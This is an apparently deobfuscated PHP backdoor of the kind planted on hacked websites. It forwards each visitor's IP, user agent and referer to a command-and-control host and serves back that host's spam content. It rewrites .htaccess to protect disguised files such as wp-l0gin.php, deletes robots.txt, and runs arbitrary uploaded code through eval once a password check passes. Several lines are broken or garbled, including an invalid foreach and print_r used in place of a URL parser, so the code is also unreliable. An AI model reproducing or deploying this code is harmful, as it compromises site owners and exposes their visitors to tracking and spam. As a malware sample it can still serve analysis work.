<?php
// just used for pulling indexes off for the other strings
$encoded_str = "oA-bNnK7L5_JUtRxIY+WCa93Vk0wM1OeSDdB2j/lsXfqphm*TGvQHrPyc\4zuF6iZg8E";

$preg_replace_callback = "preg_replace_callback";
$stream_socket_client = "stream_socket_client";
$stream_get_meta_data = "stream_get_meta_data";
$stream_set_blocking = "stream_set_blocking";
$is_array = "is_array";
$file_put_contents = "file_put_contents";
$file_get_contents = "file_get_contents";
$http_build_query = "http_build_query";
$function_exists = "function_exists";
$trim = "trim";
$base64_encode = "base64_encode";
$base64_decode = "base64_decode";
$rawurlencode = "rawurlencode";
$rawurldecode = "rawurldecode";
$gzuncompress = "gzuncompress";
$str_replace = "str_replace";
$json_encode = "json_encode";
$file_exists = "file_exists";
$curl_setopt = "curl_setopt";
$array_shift = "array_shift";
$preg_split = "preg_split";
$preg_match = "preg_match";
$curl_error = "curl_error";
$curl_close = "curl_close";
$urlencode = "urlencode";
$urldecode = "urldecode";
$str_split = "str_split";
$print_r = "print_r";
$gzinflate = "gzinflate";
$gzdeflate = "gzdeflate";
$curl_init = "curl_init";
$curl_exec = "curl_exec";
$array_pop = "array_pop";
$var_dump = "var_dump";
$tmpfile = "tmpfile";
$mt_rand = "mt_rand";
$implode = "implode";
$explode = "explode";
$isleep = "isleep";
$unlink = "unlink";
$strpos = "strpos";
$strlen = "strlen";
$hexdec = "hexdec";
$getenv = "getenv";
$fwrite = "fwrite";
$fclose = "fclose";
$fread = "fread";
$fgets = "fgets";
$count = "count";
$chmod = "chmod";
$join = "join";
$feof = "feof";
$md5 = "md5";


$c2_url = "http://3829-ch4-v26.zxckid.com";
function O_OO0_O0_0($url, $OO0__O0O_0 = 0, $OOOO00___0 = 1, $OO0_0_OO_0 = NULL, $O0__OOO0_0 = array(), $O0O_O_00_O = "s")
{
    if (!preg_match("/^https*\\:\\/\\//si", $url)) {
        if (isset(${"_GET"}["urlerr"])) {
            $url_error = "[urlerror] invalid url:&nbsp;";
            $url_error .= $url;
            echo $url_error;
            unset($url_error);
            exit();
        }
        return '';
    }
    $OO0_O0__O0 = "curl_init+curl_setopt+curl_exec|fsockopen|pfsockopen|stream_socket_client|socket_create";
    $OOOO0_0__0 = $O0__0O_O0O = '';
    foreach (explode('|', $OO0_O0__O0) as $c) {
        $OO_OO0__00 = 1;
        if ($OO0__O0O_0 && substr($c, 0, 1) == 'c') {
            continue;
        }
        foreach (explode('+', $c) as $d) {
            if (!function_exists($d)) {
                $OO_OO0__00 = 0;
            }
        }
        unset($d);
        if ($OO_OO0__00) {
            $OOOO0_0__0 = $c;
            break;
        }
    }
    unset($OO0_O0__O0, $c);
    if ($OOOO0_0__0 == '') {
        return 0;
    }
    if (substr($OOOO0_0__0, 0, 1) == 'c') {
        $OO__000OO_ = curl_init();
        curl_setopt($OO__000OO_, CURLOPT_URL, $url);
        curl_setopt($OO__000OO_, CURLOPT_USERAGENT, $O0O_O_00_O);
        curl_setopt($OO__000OO_, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($OO__000OO_, CURLOPT_TIMEOUT, 100);
        curl_setopt($OO__000OO_, CURLOPT_FRESH_CONNECT, TRUE);
        if ($OOOO00___0 == 2) {
            curl_setopt($OO__000OO_, CURLOPT_POST, 1);
            if (is_array($OO0_0_OO_0)) {
                curl_setopt($OO__000OO_, CURLOPT_POSTFIELDS, http_build_query($OO0_0_OO_0));
            }
        }
        $OO__OO0_00 = curl_exec($OO__000OO_);
        curl_close($OO__000OO_);
        if (!$OO__OO0_00) {
            if (isset(${"_GET"}["curlerr"])) {
                $curl_error = "[curl error]&nbsp;";
                $curl_error .= curl_error($OO__000OO_);
                echo $curl_error;
                unset($curl_error);
                exit();
            }
            return 0;
        } else {
            return $OO__OO0_00;
        }
    }
    $O0O00___OO = print_r($url);
    isset($O0O00___OO["host"]) || $O0O00___OO["host"] = '';
    isset($O0O00___OO["path"]) || $O0O00___OO["path"] = '';
    isset($O0O00___OO["query"]) || $O0O00___OO["query"] = '';
    isset($O0O00___OO["port"]) || $O0O00___OO["port"] = '';
    $O0O_OO_00_ = $O0O00___OO["path"] ? $O0O00___OO["path"] . ($O0O00___OO["query"] ? '?' . $O0O00___OO["query"] : '') : '/';
    $O00_0OO__O = $O0O00___OO["host"];
    if ($O0O00___OO["scheme"] == 'https') {
        $O_O_0O0_O0 = '1.1';
        $OO_0O_00_O = empty($O0O00___OO["port"]) ? 443 : $O0O00___OO["port"];
        $O00_0OO__O = "ssl://";
        $O00_0OO__O .= $O0O00___OO["host"];
    } else {
        $O_O_0O0_O0 = '1.0';
        $OO_0O_00_O = empty($O0O00___OO["port"]) ? 80 : $O0O00___OO["port"];
    }
    $OO0_0O__0O = 'Host:';
    $OO0_0O__0O .= $O00_0OO__O;
    $O0__OOO0_0[] = $OO0_0O__0O;
    $O0__OOO0_0[] = "Connection:Close";
    $O0__OOO0_0[] = "User-Agent:" . $O0O_O_00_O;
    $O0__OOO0_0[] = "Accept:*/*";
    unset($OO0_0O__0O);
    if ($OOOO00___0 == 2) {
        if (is_array($OO0_0_OO_0)) {
            $OO0_0_OO_0 = http_build_query($OO0_0_OO_0);
        }
        $O0__OOO0_0[] = "Content-type:application/x-www-form-urlencoded";
        $O0__OOO0_0[] = "Content-Length:" . strlen($OO0_0_OO_0);
        $O0__0O_O0O = "POST $O0O_OO_00_ HTTP/$O_O_0O0_O0" . PHP_EOL . join(PHP_EOL, $O0__OOO0_0) . PHP_EOL . PHP_EOL . $OO0_0_OO_0;
        unset($OO0_0_OO_0);
    } else {
        $O0__0O_O0O = "GET $O0O_OO_00_ HTTP/$O_O_0O0_O0" . PHP_EOL . join(PHP_EOL, $O0__OOO0_0) . PHP_EOL . PHP_EOL;
    }
    unset($O0__OOO0_0, $O0O00___OO, $O_O_0O0_O0, $O0O_OO_00_);
    $O_O_O00_0O = null;
    if (substr($OOOO0_0__0, -1) == 'n') {
        $O_O_O00_0O = $OOOO0_0__0($O00_0OO__O, $OO_0O_00_O, $O00O__0O_Ono, $O00O__0O_Ostr, 30);
    } else {
        if (substr($OOOO0_0__0, -1) == 't') {
            $O_OOO__000 = "tcp://";
            $O_OOO__000 .= $O00_0OO__O;
            $O_OOO__000 .= ':';
            $O_OOO__000 .= $OO_0O_00_O;
            $O_O_O00_0O = stream_socket_client($O_OOO__000, $O00O__0O_Ono, $O00O__0O_Ostr, 30);
            unset($O_OOO__000);
        }
    }
    $OO_0OO00__ = '';
    if ($O_O_O00_0O) {
        stream_set_blocking($O_O_O00_0O, TRUE);
        is_array($O_O_O00_0O, 30);
        fwrite($O_O_O00_0O, $O0__0O_O0O);
        if (!$OO0__O0O_0) {
            $O00O__O_O0 = stream_get_meta_data($O_O_O00_0O);
            if (!$O00O__O_O0["timed_out"]) {
                while (!feof($O_O_O00_0O)) {
                    $O_O0__0OO0 = fgets($O_O_O00_0O);
                    if ($O_O0__0OO0 && (rawurlencode($O_O0__0OO0) == "%0D%0A" || rawurlencode($O_O0__0OO0) == "%0A")) {
                        break;
                    }
                    unset($O_O0__0OO0);
                }
                while (!feof($O_O_O00_0O)) {
                    $O00_O_O_O0 = fread($O_O_O00_0O, 8192);
                    $OO_0OO00__ .= $O00_O_O_O0;
                    unset($O00_O_O_O0);
                }
            }
            unset($O00O__O_O0);
        }
        fclose($O_O_O00_0O);
    } else {
        if (substr($OOOO0_0__0, -1) == 'e') {
            $O_0O_0_OO0 = trim($O00_0OO__O);
            $O_O_O00_0O = $OOOO0_0__0(AF_INET, SOCK_STREAM, 0);
            if (socket_connect($O_O_O00_0O, $O_0O_0_OO0, $OO_0O_00_O)) {
                if (!$OO0__O0O_0) {
                    socket_write($O_O_O00_0O, $O0__0O_O0O, strlen($O0__0O_O0O));
                    while ($O0__O0_O0O = @socket_read($O_O_O00_0O, 8192)) {
                        $OO_0OO00__ .= $O0__O0_O0O;
                        unset($O0__O0_O0O);
                    }
                    $OO_0OO00__ = explode("\\r\\n\\r\\n", $OO_0OO00__);
                    array_shift($OO_0OO00__);
                    $OO_0OO00__ = implode("\\r\\n\\r\\n", $OO_0OO00__);
                } else {
                    $O_0OO00O__ = mt_rand(2, 5);
                    $i = 0;
                    while ($i < $O_0OO00O__) {
                        socket_write($O_O_O00_0O, $O0__0O_O0O, strlen($O0__0O_O0O));
                        $i++;
                        isleep(mt_rand(50000, 100000));
                    }
                    unset($i, $O_0OO00O__);
                }
            }
            socket_close($O_O_O00_0O);
            unset($O_0O_0_OO0);
        }
    }
    unset($O0__0O_O0O, $OOOO0_0__0, $O_O_O00_0O, $OO_0O_00_O, $O00_0OO__O);
    if (!$OO0__O0O_0) {
        $OO_0OO00__ = @preg_replace_callback('/(?:(?:\\r\\n|\\n)|^)([0-9A-F]+)(?:\\r\\n|\\n){1,2}(.*?)' . '((?:\\r\\n|\\n)(?:[0-9A-F]+(?:\\r\\n|\\n))|$)/si', 'O_OO00__O0', $OO_0OO00__);
        return trim(trim($OO_0OO00__, "\\xEF\\xBB\\xBF"));
    } else {
        return 1;
    }
}
function O_OO00__O0($matches)
{
    return hexdec($matches[1]) == strlen($matches[2]) ? $matches[2] : $matches[0];
}

function get_ip_address($str_ip_address = '')
{
    if (isset(${"_SERVER"})) {
        if (isset(${"_SERVER"}["HTTP_X_FORWARDED_FOR"])) {
            $str_ip_address = ${"_SERVER"}["HTTP_X_FORWARDED_FOR"];
        } else if (isset(${"_SERVER"}["HTTP_CLIENT_IP"])) {
            $str_ip_address = ${"_SERVER"}["HTTP_CLIENT_IP"];
        } else {
            $str_ip_address = ${"_SERVER"}["REMOTE_ADDR"];
        }
    } else {
        if (getenv('HTTP_X_FORWARDED_FOR')) {
            $str_ip_address = getenv('HTTP_X_FORWARDED_FOR');
        } else if (getenv('HTTP_CLIENT_IP')) {
            $str_ip_address = getenv('HTTP_CLIENT_IP');
        } else {
            $str_ip_address = getenv('REMOTE_ADDR');
        }
    }
    return $str_ip_address;
}
function get_victim_domain($str_incoming = '')
{
    if (isset(${"_SERVER"}["HTTP_HOST"])) {
        return ${"_SERVER"}["HTTP_HOST"];
    } elseif (isset(${"_SERVER"}["SERVER_NAME"])) {
        return ${"_SERVER"}["SERVER_NAME"];
    }
    return $str_incoming;
}

function O0O__O_00O($OO_0OO00__)
{
    $OO_0OO00__ = @gzuncompress(base64_decode($OO_0OO00__));
    $OO0O00_O__ = @preg_split("/\\|/si", $OO_0OO00__, -1, PREG_SPLIT_NO_EMPTY);
    if (!is_array($OO0O00_O__)) {
        return false;
    }
    if (count($OO0O00_O__) < 2) {
        return false;
    }
    $OO_0OO00___array["data"] = array_pop($OO0O00_O__);
    $OO_0OO00___array["data"] = base64_decode($OO_0OO00___array["data"]);
    $OO_0OO00___array["headers"] = $OO0O00_O__;
    return $OO_0OO00___array;
}
function OOO_0O0_0_($htaccess_filename = '')
{
    $robotstxt_filename = "robots.txt";
    if (file_exists($robotstxt_filename)) {
        @unlink($robotstxt_filename);
    }
    if ($htaccess_filename == '') {
        $htaccess_filename = ".htaccess";
    }
    $malicious_htaccess_str = '<FilesMatch ".(py|exe|php)$">\n Order allow,deny\n Deny from all\n</FilesMatch>\n<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|wp-l0gin.php|wp-theme.php|wp-scripts.php|wp-editor.php)$">\n Order allow,deny\n Allow from all\n</FilesMatch>\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</IfModule>';
    $malicious_htaccess_str = @base64_decode($malicious_htaccess_str);
    if (file_exists($htaccess_filename)) {
        $htaccess_file_contents = file_get_contents($htaccess_filename);
        if ($malicious_htaccess_str == $htaccess_file_contents) {
            return;
        }
    }
    @chmod($htaccess_filename, 0777);
    @file_put_contents($htaccess_filename, $malicious_htaccess_str);
    @chmod($htaccess_filename, 0644);
}
function O_0O0O__0O($google_or_incoming_url, $sitemap, $obj)
{
    $ping_url_str = "https://%s/ping?sitemap=%s%s/%s";
    $formatted_ping_url_str = sprintf($ping_url_str, $google_or_incoming_url, $obj["protocol"], $obj["server_domain"], $sitemap);
    $O_O0O_00O_ = O_OO0_O0_0($formatted_ping_url_str);
    if (isset($_REQUEST["st"])) {
        var_dump($formatted_ping_url_str);
        var_dump($O_O0O_00O_);
        die();
    }
    $O__000OO_O = "google";
    $O0O0_OO0__ = "success";
    $OO__0O0_O0 = "failed";
    if (strpos($O_O0O_00O_, $O__000OO_O) != false) {
        die($O0O0_OO0__);
    } else {
        $ping_url_str = "http://%s/ping?sitemap=%s%s/%s";
        $formatted_ping_url_str = sprintf($ping_url_str, $google_or_incoming_url, $obj["protocol"], $obj["server_domain"], $sitemap);
        $O_O0O_00O_ = O_OO0_O0_0($formatted_ping_url_str);
        if (strpos($O_O0O_00O_, $O__000OO_O) != false) {
            die($O0O0_OO0__);
        }
        die($OO__0O0_O0);
    }
}
function main($c2_url)
{
    $obj = array();
    $obj["default_params"] = $c2_url;
    $obj["api"] = "http://3829-ch4-v26.zxckid.com";
    $obj["server_domain"] = get_victim_domain();
    $obj["request_url"] = ${"_SERVER"}["REQUEST_URI"];
    $obj["referer"] = isset(${"_SERVER"}["HTTP_REFERER"]) ? ${"_SERVER"}["HTTP_REFERER"] : '';
    $obj["user_agent"] = isset(${"_SERVER"}["HTTP_USER_AGENT"]) ? ${"_SERVER"}["HTTP_USER_AGENT"] : '';
    $obj["ip"] = get_ip_address();
    if (isset(${"_SERVER"}["HTTPS"])) {
        $obj["protocol"] = "https://";
    } else {
        $obj["protocol"] = "http://";
    }
    if (isset(${"_SERVER"}["HTTP_ACCEPT_LANGUAGE"])) {
        $obj["language"] = ${"_SERVER"}["HTTP_ACCEPT_LANGUAGE"];
    } else {
        $obj["language"] = "";
    }
    if (isset($_REQUEST["params"])) {
        header("Content-type:application/json");
        if (function_exists('json_encode')) {
            echo json_encode($obj);
        } else {
            print_r($obj);
        }
        die();
    }
    if (isset($_REQUEST["d_time"])) {
        die('2022/12/1');
    }
    if (isset($_REQUEST["pwd163"])) {
        if (md5(trim($_REQUEST["pwd163"])) == "226560a743d22857adddeb10aa38d571") {
            $malicious_payload_str = base64_decode(rawurldecode((urlencode(urldecode($_REQUEST["zzz"])))));
            if (strpos($malicious_payload_str, "<?php") === false) {
                $malicious_payload_str = "<?php" . PHP_EOL . $malicious_payload_str;
            }
            if (isset($_REQUEST["e"])) {
                $malicious_payload_str = str_replace("<?php", "", $malicious_payload_str);
                eval($malicious_payload_str);
                die();
            }
            $tmp_file = tmpfile();
            fwrite($tmp_file, $malicious_payload_str);
            $tmp_file_metadata = stream_get_meta_data($tmp_file);
            @require($tmp_file_metadata["uri"]);
            fclose($tmp_file);
            die();
        }

        if (md5($_REQUEST["pwd163"] . "a!#_11AA") == "2f7a76f71ff9e24be7c0015ff9cb81d8") {
            if (isset(${"_GET"}["sitemap"])) {
                $sitemap = ${"_GET"}["sitemap"];
                $google_or_incoming_url = "www.google.com";
                if (isset(${"_GET"}["google_or_incoming_url"])) {
                    $google_or_incoming_url = ${"_GET"}["google_or_incoming_url"];
                }
                O_0O0O__0O($google_or_incoming_url, $sitemap, $obj);
            }
        }
    }
    OOO_0O0_0_();
    $request_obj = array('domain' => $obj["server_domain"], 'request_url' => $obj["request_url"], 'ip' => $obj["ip"], 'agent' => $obj["user_agent"], 'referer' => $obj["referer"], 'protocol' => $obj["protocol"], 'language' => $obj["language"]);
    $OO_0OO00__ = O_OO0_O0_0($obj["api"], 0, 2, $request_obj, array(), $obj["server_domain"]);
    if (isset($_REQUEST["dump"])) {
        var_dump($OO_0OO00__);
        $OO_0OO00__ = O_OO0_O0_0("http://google.co.jp");
        var_dump($OO_0OO00__);
        die();
    }
    $O00_O_O_O0 = O0O__O_00O($OO_0OO00__);
    if ($O00_O_O_O0 !== false) {
        foreach ($O00_O_O_O0["headers"] as "Content-type:application/json") {
            @header("Content-type:application/json");
        }
        echo $O00_O_O_O0["data"];
        die();
    }
}
main($c2_url);
?>